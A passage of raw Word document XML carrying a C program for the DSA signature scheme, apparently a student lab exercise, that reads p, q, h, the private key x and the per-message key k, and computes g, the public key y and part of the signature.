      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>veIn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>erse(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p,q,h,g,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>,s,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,x,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t>z,k,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>,hash;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pP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pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber p and e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er q pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of (p-1):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d %d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>p,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>q);</w:t>
      </w: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t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>gre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">1 and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(p-1):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>h);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="7627"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e g t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= (p-1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>q;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>g =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(h,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pP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rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser's pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e key such </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s grea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han 0 and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han q :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>x);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="6066"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er user's pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c key y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(g,x,p);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>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rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser's pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage secret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">key k such </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s grea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han 0 and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>an q :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>k);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he hash(M) va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>hash);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="6148"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>r and s pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r z = p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wer(g,k,p);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>r =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>% q;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nv = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
